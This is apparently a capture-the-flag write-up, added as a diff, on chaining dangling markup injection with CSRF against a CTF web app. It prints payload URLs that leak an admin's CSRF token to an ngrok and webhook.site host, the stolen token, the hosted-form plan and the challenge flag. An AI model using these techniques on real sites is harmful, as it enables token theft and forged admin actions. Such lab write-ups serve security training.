@@ -1,0 +1,48 @@
+Add vip require csrf_token
+```
+POST /add_vip HTTP/1.1
+
+username=l3o&csrf_token=e957d0d585a31e1a0b8f4924886d9906c072ba1ab72d1dd8db928d8783c2abe5
+```
+
+Only the administartor can add a vip member, or CSRF token is invalid
+
+http://remote1.thcon.party:10701/add_vip?message=Warning%20only%20admin%20can%20add%20vip%20members
+```
+Content-Security-Policy: connect-src 'none'; font-src 'none'; frame-src 'none'; img-src * data:; manifest-src 'none'; media-src 'none'; object-src 'none'; script-src 'none'; worker-src 'none'; style-src 'self'; frame-ancestors 'none'; block-all-mixed-content;
+```
+
+XSS
+```
+<img src='https://webhook.site/f3ad3f2a-8e98-4b10-9952-41fe382ea449'>
+```
+
+Dangling markup injection => Steal admin CSRF token
+
+
+Report to http://remote1.thcon.party:10701/bounty
+
+
+http://remote1.thcon.party:10701/add_vip?message=%3ctable%20background%3d%27http%3a%2f%2ff195c8c42004.ngrok.io/%3fc-
+```
+?c-</p>      </div>      <div class="form_box">      <h1>Add VIP member !</h1>        <form method="POST" action="/add_vip">            <label for="username">Client to add :</label>            <input name="username" type="text" id="username"/>            <input name="csrf_token" type="hidden" value="5775c6e0c1f52500d1b96e7619dc8c63c50040b39b501d5affdddd09845d3a0b" />            <input type="submit" value="Submit"/>        </form>    </div>        <p class=
+```
+
+csrf_token=5775c6e0c1f52500d1b96e7619dc8c63c50040b39b501d5affdddd09845d3a0b
+
+
+Add vip again with this token
+
+Create index.html containing the add_vip form
+
+Report
+```
+http://f195c8c42004.ngrok.io
+```
+
+http://remote1.thcon.party:10701/vip
+```
+Welcome to secret area only accessible for vip members ! Here is the secret 0day we found recently:
+
+THCon21{L0ve_C5RF_C0MB1n3d_W1tH_D4Ngl1nG_M4Rkup}
+```
